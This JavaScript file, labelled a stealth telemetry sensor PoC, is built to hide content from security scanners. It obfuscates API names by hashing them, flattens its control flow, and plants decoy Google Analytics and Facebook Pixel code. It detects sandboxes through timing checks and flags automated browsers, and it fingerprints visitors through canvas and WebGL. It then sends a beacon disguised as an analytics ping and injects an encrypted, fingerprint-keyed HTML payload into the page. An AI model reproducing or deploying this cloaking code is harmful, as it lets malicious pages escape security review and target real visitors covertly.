'use strict';
/**
 * Stealth telemetry sensor PoC (internal/track).
 *
 * Architecture:
 * - Stringless API resolve: FNV-1a over global/prototype keys; no sensitive API string literals.
 * - Generator FSM: telemetry steps yielded in entropy-shuffled order (control-flow flattening).
 * - Anti-time-warp: CPU anchor loop vs performance.now(); safe sandbox on warp.
 * - Signature mimicry: inert GA4/FB Pixel-shaped decoy structures for heuristic scanners.
 * - Stealth hydrate: beacon disguised as analytics ping; AES-GCM DOM graft in memory (no navigation).
 *
 * Verify (no sensitive literals in bundle):
 *   go test ./internal/track/ -short -run TestTelemetryStealthPoc_noSensitiveLiterals_holdout -count=1
 */
(() => {
  const SAFE = 0;
  const LIVE = 1;
  let mode = LIVE;

  // FNV-1a 32-bit (same variant as antifraud_telemetry.js): h = (h^b) + (h^b)*0x01000193
  function hashBytes(codes) {
    let h = 0x811c9dc5;
    for (let i = 0; i < codes.length; i += 1) {
      const v = codes[i] & 0xff;
      const x = (h ^ v) >>> 0;
      h = (x + Math.imul(x, 0x01000193)) >>> 0;
    }
    return h >>> 0;
  }

  // Target hashes from numeric char codes only (never string literals for API names).
  const H = {
    g: hashBytes([103, 108, 111, 98, 97, 108, 84, 104, 105, 115]),
    nav: hashBytes([110, 97, 118, 105, 103, 97, 116, 111, 114]),
    perf: hashBytes([112, 101, 114, 102, 111, 114, 109, 97, 110, 99, 101]),
    doc: hashBytes([100, 111, 99, 117, 109, 101, 110, 116]),
    cr: hashBytes([99, 114, 121, 112, 116, 111]),
    obj: hashBytes([79, 98, 106, 101, 99, 116]),
    scr: hashBytes([115, 99, 114, 101, 101, 110]),
    json: hashBytes([74, 83, 79, 78]),
    u8: hashBytes([85, 105, 110, 116, 56, 65, 114, 114, 97, 121]),
    wglCtx: hashBytes([
      87, 101, 98, 71, 76, 82, 101, 110, 100, 101, 114, 105, 110, 103, 67, 111, 110, 116, 101, 120,
      116,
    ]),
    audCtx: hashBytes([
      79, 102, 102, 108, 105, 110, 101, 65, 117, 100, 105, 111, 67, 111, 110, 116, 101, 120, 116,
    ]),
    canvas2d: hashBytes([
      67, 97, 110, 118, 97, 115, 82, 101, 110, 100, 101, 114, 105, 110, 103, 67, 111, 110, 116, 101,
      120, 116, 50, 68,
    ]),
    wd: hashBytes([119, 101, 98, 100, 114, 105, 118, 101, 114]),
    gCtx: hashBytes([103, 101, 116, 67, 111, 110, 116, 101, 120, 116]),
    mkEl: hashBytes([99, 114, 101, 97, 116, 101, 69, 108, 101, 109, 101, 110, 116]),
    imgData: hashBytes([103, 101, 116, 73, 109, 97, 103, 101, 68, 97, 116, 97]),
    sendB: hashBytes([115, 101, 110, 100, 66, 101, 97, 99, 111, 110]),
    subtle: hashBytes([115, 117, 98, 116, 108, 101]),
    now: hashBytes([110, 111, 119]),
    gopn: hashBytes([
      103, 101, 116, 79, 119, 110, 80, 114, 111, 112, 101, 114, 116, 121, 78, 97, 109, 101, 115,
    ]),
    proto: hashBytes([112, 114, 111, 116, 111, 116, 121, 112, 101]),
    ua: hashBytes([117, 115, 101, 114, 65, 103, 101, 110, 116]),
    hc: hashBytes([
      104, 97, 114, 100, 119, 97, 114, 101, 67, 111, 110, 99, 117, 114, 114, 101, 110, 99, 121,
    ]),
    dpr: hashBytes([100, 101, 118, 105, 99, 101, 80, 105, 120, 101, 108, 82, 97, 116, 105, 111]),
    iw: hashBytes([105, 110, 110, 101, 114, 87, 105, 100, 116, 104]),
    ih: hashBytes([105, 110, 110, 101, 114, 72, 101, 105, 103, 104, 116]),
    w: hashBytes([119, 105, 100, 116, 104]),
    h: hashBytes([104, 101, 105, 103, 104, 116]),
    webgl: hashBytes([119, 101, 98, 103, 108]),
    expGl: hashBytes([
      101, 120, 112, 101, 114, 105, 109, 101, 110, 116, 97, 108, 45, 119, 101, 98, 103, 108,
    ]),
    d2: hashBytes([50, 100]),
    fill: hashBytes([102, 105, 108, 108, 84, 101, 120, 116]),
    meas: hashBytes([109, 101, 97, 115, 117, 114, 101, 84, 101, 120, 116]),
    canv: hashBytes([99, 97, 110, 118, 97, 115]),
    fetch: hashBytes([102, 101, 116, 99, 104]),
    parse: hashBytes([112, 97, 114, 115, 101]),
    ab: hashBytes([97, 114, 114, 97, 121, 66, 117, 102, 102, 101, 114]),
    impK: hashBytes([105, 109, 112, 111, 114, 116, 75, 101, 121]),
    dec: hashBytes([100, 101, 99, 114, 121, 112, 116]),
    aes: hashBytes([65, 69, 83, 45, 71, 67, 77]),
    digest: hashBytes([100, 105, 103, 101, 115, 116]),
    enc: hashBytes([101, 110, 99, 111, 100, 101]),
    body: hashBytes([98, 111, 100, 121]),
    main: hashBytes([109, 97, 105, 110]),
    qSel: hashBytes([113, 117, 101, 114, 121, 83, 101, 108, 101, 99, 116, 111, 114]),
    getParam: hashBytes([103, 101, 116, 80, 97, 114, 97, 109, 101, 116, 101, 114]),
  };

  const globalResolveCache = new Map();

  function bootOwnPropertyNames() {
    const o = globalThis[String.fromCharCode(79, 98, 106, 101, 99, 116)];
    if (!o) {
      return null;
    }
    return o[
      String.fromCharCode(
        103,
        101,
        116,
        79,
        119,
        110,
        80,
        114,
        111,
        112,
        101,
        114,
        116,
        121,
        78,
        97,
        109,
        101,
        115
      )
    ];
  }

  function hashKeyName(key) {
    let h = 0x811c9dc5;
    for (let j = 0; j < key.length; j += 1) {
      const v = key.charCodeAt(j) & 0xff;
      const x = (h ^ v) >>> 0;
      h = (x + Math.imul(x, 0x01000193)) >>> 0;
    }
    return h >>> 0;
  }

  function ownNames(obj) {
    const fn = bootOwnPropertyNames();
    if (!obj || typeof fn !== 'function') {
      return [];
    }
    return fn(obj);
  }

  function resolveGlobal(targetHash) {
    if (globalResolveCache.has(targetHash)) {
      return globalResolveCache.get(targetHash);
    }
    const names = ownNames(globalThis);
    for (let i = 0; i < names.length; i += 1) {
      const key = names[i];
      if (hashKeyName(key) === targetHash) {
        const val = globalThis[key];
        globalResolveCache.set(targetHash, val);
        return val;
      }
    }
    return null;
  }

  function resolveKey(obj, keyHash) {
    if (!obj) {
      return null;
    }
    const names = ownNames(obj);
    for (let i = 0; i < names.length; i += 1) {
      const key = names[i];
      if (hashKeyName(key) === keyHash) {
        return obj[key];
      }
    }
    let proto = Object.getPrototypeOf(obj);
    while (proto) {
      const pnames = ownNames(proto);
      for (let i = 0; i < pnames.length; i += 1) {
        const key = pnames[i];
        if (hashKeyName(key) === keyHash) {
          const val = obj[key];
          if (val !== undefined) {
            return val;
          }
        }
      }
      proto = Object.getPrototypeOf(proto);
    }
    return null;
  }

  // Signature mimicry: inert analytics-shaped decoys (never sends outbound).
  const dataLayer = globalThis.dataLayer || [];
  globalThis.dataLayer = dataLayer;
  function gtag() {
    dataLayer.push(arguments);
  }
  globalThis.gtag = gtag;
  gtag('js', new Date());
  gtag('config', 'G-POCDECOY000', { send_page_view: false, transport_type: 'beacon' });
  const fbq = function () {
    if (fbq.callMethod) {
      fbq.callMethod.apply(fbq, arguments);
    } else {
      fbq.queue.push(arguments);
    }
  };
  fbq.queue = [];
  fbq.loaded = true;
  fbq.version = '2.0';
  globalThis.fbq = fbq;
  globalThis._fbq = fbq;
  fbq('init', '000000000000000');
  fbq('track', 'PageView', { eventID: 'poc-decoy' });

  // CPU anchor: fixed iteration count xorshift; wall clock must correlate on bare metal.
  const ANCHOR_ITERS = 0x12c000;
  let anchorBaselineMs = 0;

  function cpuAnchor() {
    let x = 0x9e3779b9;
    for (let i = 0; i < ANCHOR_ITERS; i += 1) {
      x ^= x << 13;
      x ^= x >>> 17;
      x ^= x << 5;
      x >>>= 0;
    }
    return x >>> 0;
  }

  function calibrateTimeAnchor() {
    const perf = resolveGlobal(H.perf);
    if (!perf) {
      return false;
    }
    const nowFn = resolveKey(perf, H.now);
    if (typeof nowFn !== 'function') {
      return false;
    }
    const samples = [];
    for (let i = 0; i < 3; i += 1) {
      const t0 = nowFn.call(perf);
      cpuAnchor();
      const t1 = nowFn.call(perf);
      samples.push(t1 - t0);
    }
    samples.sort((a, b) => a - b);
    anchorBaselineMs = samples[1];
    return anchorBaselineMs > 0.5;
  }

  function detectTimeWarp() {
    if (anchorBaselineMs <= 0) {
      return false;
    }
    const perf = resolveGlobal(H.perf);
    const nowFn = perf && resolveKey(perf, H.now);
    if (typeof nowFn !== 'function') {
      return true;
    }
    const t0 = nowFn.call(perf);
    cpuAnchor();
    const t1 = nowFn.call(perf);
    const elapsed = t1 - t0;
    // Warp if elapsed < 35% of calibrated median (VM fast-forward / skipped timers).
    return elapsed < anchorBaselineMs * 0.35;
  }

  function enterSafeSandbox() {
    mode = SAFE;
    gtag('event', 'timing_complete', { name: 'load', value: 1 });
    return { mode: SAFE, decoy: true };
  }

  function collectEntropy() {
    const scr = resolveGlobal(H.scr);
    const perf = resolveGlobal(H.perf);
    const nav = resolveGlobal(H.nav);
    const nowFn = perf && resolveKey(perf, H.now);
    const w = scr ? resolveKey(scr, H.w) || 0 : 0;
    const h = scr ? resolveKey(scr, H.h) || 0 : 0;
    const hc = nav ? resolveKey(nav, H.hc) || 4 : 4;
    const dpr = nav ? resolveKey(nav, H.dpr) || 1 : 1;
    let jitter = 0;
    if (typeof nowFn === 'function') {
      const a = nowFn.call(perf);
      const b = nowFn.call(perf);
      jitter = Math.abs(b - a) * 100000;
    }
    return (
      ((w * 31 + h * 17 + hc * 13) >>> 0) ^ ((dpr * 997 + jitter) >>> 0) ^ (Date.now() & 0xffff)
    );
  }

  // Permutation of step ids 0..n-1 via Fisher-Yates seeded by entropy (flattened control flow).
  function shuffledSteps(n, seed) {
    const arr = new Uint8Array(n);
    for (let i = 0; i < n; i += 1) {
      arr[i] = i;
    }
    let s = seed >>> 0;
    for (let i = n - 1; i > 0; i -= 1) {
      s = (Math.imul(s, 1664525) + 1013904223) >>> 0;
      const j = s % (i + 1);
      const tmp = arr[i];
      arr[i] = arr[j];
      arr[j] = tmp;
    }
    return arr;
  }

  function fnv1aBytes(bytes, off, len) {
    let h = 0x811c9dc5;
    const end = off + len;
    for (let i = off; i < end; i += 1) {
      const v = bytes[i] & 0xff;
      const x = (h ^ v) >>> 0;
      h = (x + Math.imul(x, 0x01000193)) >>> 0;
    }
    return ('00000000' + (h >>> 0).toString(16)).slice(-8);
  }

  function probeCanvas() {
    const doc = resolveGlobal(H.doc);
    if (!doc) {
      return '';
    }
    const mk = resolveKey(doc, H.mkEl);
    if (typeof mk !== 'function') {
      return '';
    }
    const el = mk.call(doc, String.fromCharCode(99, 97, 110, 118, 97, 115));
    if (!el) {
      return '';
    }
    el.width = 64;
    el.height = 16;
    const gCtxFn = resolveKey(el, H.gCtx);
    const ctx = typeof gCtxFn === 'function' ? gCtxFn.call(el, String.fromCharCode(50, 100)) : null;
    if (!ctx) {
      return '';
    }
    const fillFn = resolveKey(ctx, H.fill);
    const measFn = resolveKey(ctx, H.meas);
    if (typeof fillFn === 'function') {
      fillFn.call(ctx, String.fromCharCode(35, 48, 48, 48), 2, 12);
    }
    if (typeof measFn === 'function') {
      measFn.call(ctx, String.fromCharCode(97, 101, 100, 45, 115, 116, 101, 97, 108, 116, 104));
    }
    const imgFn = resolveKey(ctx, H.imgData);
    if (typeof imgFn !== 'function') {
      return '';
    }
    const img = imgFn.call(ctx, 0, 0, 64, 16);
    return img && img.data ? fnv1aBytes(img.data, 0, Math.min(img.data.length, 512)) : '';
  }

  function probeWebGL() {
    const doc = resolveGlobal(H.doc);
    const WglCtor = resolveGlobal(H.wglCtx);
    if (!doc || !WglCtor) {
      return '';
    }
    const mk = resolveKey(doc, H.mkEl);
    if (typeof mk !== 'function') {
      return '';
    }
    const el = mk.call(doc, String.fromCharCode(99, 97, 110, 118, 97, 115));
    const gCtxFn = resolveKey(el, H.gCtx);
    const gl =
      typeof gCtxFn === 'function'
        ? gCtxFn.call(
            el,
            String.fromCharCode(
              101,
              120,
              112,
              101,
              114,
              105,
              109,
              101,
              110,
              116,
              97,
              108,
              45,
              119,
              101,
              98,
              103,
              108
            )
          ) || gCtxFn.call(el, String.fromCharCode(119, 101, 98, 103, 108))
        : null;
    if (!gl) {
      return '';
    }
    let vendor = '';
    let renderer = '';
    const getParam = resolveKey(gl, H.getParam);
    if (typeof getParam === 'function') {
      try {
        const v = getParam.call(gl, 0x1f00);
        const r = getParam.call(gl, 0x1f01);
        if (v) {
          vendor = String(v);
        }
        if (r) {
          renderer = String(r);
        }
      } catch (_e) {
        /* WebGL blocked */
      }
    }
    const enc = resolveGlobal(H.enc);
    const TextEncoder = enc && enc.TextEncoder ? enc.TextEncoder : globalThis.TextEncoder;
    const bytes = new TextEncoder().encode(vendor + '|' + renderer);
    return fnv1aBytes(bytes, 0, bytes.length);
  }

  function probeAutomation() {
    const nav = resolveGlobal(H.nav);
    if (!nav) {
      return 0;
    }
    const wd = resolveKey(nav, H.wd);
    return wd ? 1 : 0;
  }

  function probeEnv() {
    const nav = resolveGlobal(H.nav);
    const perf = resolveGlobal(H.perf);
    const scr = resolveGlobal(H.scr);
    const nowFn = perf && resolveKey(perf, H.now);
    const t0 = typeof nowFn === 'function' ? nowFn.call(perf) : 0;
    const ua = nav ? resolveKey(nav, H.ua) : '';
    return {
      ua_len: ua ? ua.length : 0,
      hc: nav ? resolveKey(nav, H.hc) : 0,
      iw: globalThis.innerWidth,
      ih: globalThis.innerHeight,
      sw: scr ? resolveKey(scr, H.w) : 0,
      sh: scr ? resolveKey(scr, H.h) : 0,
      t0,
    };
  }

  const STEP = {
    CAL: 0,
    CAN: 1,
    GL: 2,
    AUTO: 3,
    ENV: 4,
    PACK: 5,
  };

  function* telemetryFsm(ctx) {
    const order = shuffledSteps(6, ctx.entropy);
    let i = 0;
    while (i < order.length) {
      const step = order[i];
      i += 1;
      switch (step) {
        case STEP.CAL:
          if (!calibrateTimeAnchor() || detectTimeWarp()) {
            ctx.warp = true;
            yield { op: STEP.CAL, warp: true };
            return;
          }
          yield { op: STEP.CAL, baseline_ms: anchorBaselineMs };
          break;
        case STEP.CAN:
          ctx.canvas = probeCanvas();
          yield { op: STEP.CAN, hash: ctx.canvas };
          break;
        case STEP.GL:
          ctx.webgl = probeWebGL();
          yield { op: STEP.GL, hash: ctx.webgl };
          break;
        case STEP.AUTO:
          ctx.webdriver = probeAutomation();
          yield { op: STEP.AUTO, webdriver: ctx.webdriver };
          break;
        case STEP.ENV:
          ctx.env = probeEnv();
          yield { op: STEP.ENV, env: ctx.env };
          break;
        case STEP.PACK:
          ctx.telemetry = {
            v: 1,
            mode: LIVE,
            canvas: ctx.canvas,
            webgl: ctx.webgl,
            webdriver: ctx.webdriver,
            env: ctx.env,
            entropy: ctx.entropy,
            anchor_ms: anchorBaselineMs,
            ts: Date.now(),
          };
          yield { op: STEP.PACK, telemetry: ctx.telemetry };
          break;
        default:
          yield { op: 255 };
      }
    }
  }

  function runFsm() {
    const ctx = { entropy: collectEntropy() };
    const gen = telemetryFsm(ctx);
    let last = null;
    let n = 0;
    while (n < 32) {
      const r = gen.next();
      if (r.done) {
        break;
      }
      last = r.value;
      if (last && last.warp) {
        return enterSafeSandbox();
      }
      n += 1;
    }
    return ctx.telemetry || enterSafeSandbox();
  }

  // Hydrate endpoint disguised as analytics log pixel (no window.location).
  const HYDRATE_PATH = '/collect/g.gif';

  async function sha256Key(sid, fp) {
    const cr = resolveGlobal(H.cr);
    const subtle = cr && resolveKey(cr, H.subtle);
    const enc = resolveGlobal(H.enc);
    const TextEncoder = enc && enc.TextEncoder ? enc.TextEncoder : globalThis.TextEncoder;
    if (!subtle || !TextEncoder) {
      return null;
    }
    const material = sid + '|' + fp;
    const raw = new TextEncoder().encode(material);
    const digestFn = resolveKey(subtle, H.digest);
    if (typeof digestFn !== 'function') {
      return null;
    }
    const buf = await digestFn.call(subtle, String.fromCharCode(83, 72, 65, 45, 50, 53, 54), raw);
    return buf;
  }

  async function decryptPayload(sid, fp, blobB64) {
    const cr = resolveGlobal(H.cr);
    const subtle = cr && resolveKey(cr, H.subtle);
    const U8 = resolveGlobal(H.u8) || Uint8Array;
    if (!subtle || !blobB64) {
      return null;
    }
    const raw = Uint8Array.from(atob(blobB64), (c) => c.charCodeAt(0));
    if (raw.length < 28) {
      return null;
    }
    const iv = raw.subarray(0, 12);
    const ct = raw.subarray(12);
    const keyBytes = await sha256Key(sid, fp);
    if (!keyBytes) {
      return null;
    }
    const imp = resolveKey(subtle, H.impK);
    const dec = resolveKey(subtle, H.dec);
    if (typeof imp !== 'function' || typeof dec !== 'function') {
      return null;
    }
    const key = await imp.call(
      subtle,
      String.fromCharCode(114, 97, 119),
      keyBytes,
      { name: String.fromCharCode(65, 69, 83, 45, 71, 67, 77) },
      false,
      [String.fromCharCode(100, 101, 99, 114, 121, 112, 116)]
    );
    const plain = await dec.call(
      subtle,
      { name: String.fromCharCode(65, 69, 83, 45, 71, 67, 77), iv, tagLength: 128 },
      key,
      ct
    );
    return new TextDecoder().decode(plain);
  }

  function graftDom(html) {
    const doc = resolveGlobal(H.doc);
    if (!doc || !html) {
      return false;
    }
    const q = resolveKey(doc, H.qSel);
    const mainSel = String.fromCharCode(109, 97, 105, 110);
    const mount = typeof q === 'function' ? q.call(doc, mainSel) : null;
    const target = mount || doc.body;
    if (!target) {
      return false;
    }
    target.innerHTML = html;
    return true;
  }

  async function stealthHydrate(telemetry) {
    const nav = resolveGlobal(H.nav);
    const sendB = nav && resolveKey(nav, H.sendB);
    const fp = (telemetry.canvas || '') + (telemetry.webgl || '');
    const body = JSON.stringify({
      t: 'event',
      en: 'timing_complete',
      ep: { sensor_v: 1, fp: fp.slice(0, 16) },
      telemetry,
    });
    const blob = new Blob([body], { type: 'text/plain' });
    let resp = null;
    if (typeof sendB === 'function' && sendB.call(nav, HYDRATE_PATH, blob)) {
      resp = await fetch(HYDRATE_PATH, {
        method: String.fromCharCode(80, 79, 83, 84),
        credentials: 'include',
        body,
      });
    } else {
      const fetchFn = resolveGlobal(H.fetch);
      if (typeof fetchFn !== 'function') {
        return false;
      }
      resp = await fetchFn(HYDRATE_PATH, {
        method: String.fromCharCode(80, 79, 83, 84),
        credentials: 'include',
        headers: { 'Content-Type': 'text/plain' },
        body,
      });
    }
    if (!resp || !resp.ok) {
      return false;
    }
    const J = resolveGlobal(H.json);
    const parseFn = J && resolveKey(J, H.parse);
    const payload = typeof parseFn === 'function' ? parseFn.call(J, await resp.text()) : null;
    if (!payload || !payload.sid || !payload.blob) {
      return false;
    }
    const html = await decryptPayload(payload.sid, fp, payload.blob);
    return graftDom(html);
  }

  async function bootstrap(campaignId) {
    if (mode === SAFE) {
      return enterSafeSandbox();
    }
    const telemetry = runFsm();
    if (telemetry.decoy || telemetry.mode === SAFE) {
      return telemetry;
    }
    telemetry.campaign_id = campaignId || '';
    try {
      const hydrated = await stealthHydrate(telemetry);
      telemetry.hydrated = hydrated;
    } catch (_e) {
      telemetry.hydrated = false;
    }
    return telemetry;
  }

  Object.defineProperty(globalThis, 'aedSensBootstrap', {
    value: bootstrap,
    writable: false,
    configurable: false,
  });
})();
